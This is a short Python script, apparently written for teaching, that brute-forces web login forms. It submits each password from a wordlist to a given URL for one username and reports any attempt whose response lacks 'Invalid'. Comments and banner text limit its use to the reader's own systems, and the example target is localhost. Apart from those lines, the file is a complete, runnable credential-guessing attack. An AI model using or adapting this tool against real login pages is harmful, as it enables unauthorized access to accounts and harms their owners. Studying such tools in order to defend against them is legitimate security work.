#!/usr/bin/env python3
# hydra.py — a Python login brute-forcer for learning.
# Only use on systems you own or have written permission to test.

import sys
import time
import urllib.request
import urllib.parse


def try_login(url, username, password):
    """Try a single login attempt. Returns True if successful."""
    data = urllib.parse.urlencode({
        "username": username,
        "password": password
    }).encode()

    req = urllib.request.Request(url, data=data, method="POST")

    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            body = response.read().decode(errors="replace")
            # If the response does NOT contain "Invalid", we logged in
            if "Invalid" not in body:
                return True
            return False
    except Exception as e:
        print(f"  [!] Error trying {password}: {e}")
        return False


def main():
    print("=" * 60)
    print("  Hydra v1.0 — Python login brute-forcer")
    print("  ⚠️  For learning only. Test only what you own.")
    print("=" * 60)
    print()

    # Get arguments
    if len(sys.argv) < 4:
        print("Usage: python hydra.py <URL> <username> <wordlist>")
        print()
        print("Example:")
        print("  python hydra.py http://127.0.0.1:5000/login felix passwords.txt")
        sys.exit(1)

    url = sys.argv[1]
    username = sys.argv[2]
    wordlist_file = sys.argv[3]

    # Read the wordlist
    try:
        with open(wordlist_file, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ Wordlist not found: {wordlist_file}")
        sys.exit(1)

    print(f"Target:   {url}")
    print(f"Username: {username}")
    print(f"Wordlist: {wordlist_file} ({len(passwords)} passwords)")
    print()
    print("Starting attack...")
    print()

    start_time = time.time()

    for i, password in enumerate(passwords, 1):
        # Show progress every 5 attempts
        if i % 5 == 1:
            print(f"  [{i}/{len(passwords)}] Trying: {password}")

        if try_login(url, username, password):
            elapsed = time.time() - start_time
            print()
            print("=" * 60)
            print(f"✅ PASSWORD FOUND!")
            print(f"   Username: {username}")
            print(f"   Password: {password}")
            print(f"   Attempts: {i}")
            print(f"   Time:     {elapsed:.2f} seconds")
            print("=" * 60)
            return

    # If we get here, no password worked
    elapsed = time.time() - start_time
    print()
    print("=" * 60)
    print("❌ No password found in the wordlist.")
    print(f"   Tried: {len(passwords)} passwords")
    print(f"   Time:  {elapsed:.2f} seconds")
    print("=" * 60)


if __name__ == "__main__":
    main()
